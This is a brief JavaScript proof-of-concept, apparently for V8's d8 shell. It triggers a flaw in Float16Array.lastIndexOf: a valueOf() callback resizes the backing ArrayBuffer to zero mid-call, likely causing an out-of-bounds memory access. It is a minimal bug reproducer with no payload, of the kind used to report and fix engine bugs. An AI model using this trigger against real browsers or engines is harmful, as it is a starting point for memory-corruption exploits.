// Create a variable-length ArrayBuffer, with a maximum of 16 bytes
const arrBuffer = new ArrayBuffer(16, {
    "maxByteLength": 16,
});

// Create a Float16Array based on the variable-length ArrayBuffer
// Testing found that only Float16Array has a problem, Float32Array is normal
// f16Arr->length = 8
const f16Arr = new Float16Array(arrBuffer); 

// fromIdx triggers the valueOf() callback function when used as a numeric context
const fromIdx = {
    valueOf() {
        // Resize the arrBuffer to 0
        arrBuffer.resize(0);
        return 7;
    },
};

// Start from fromIdx, search for the index of ele from end to start
const ele = 0;
f16Arr.lastIndexOf(ele, fromIdx);
//./d8 --js-float16array ./poc.js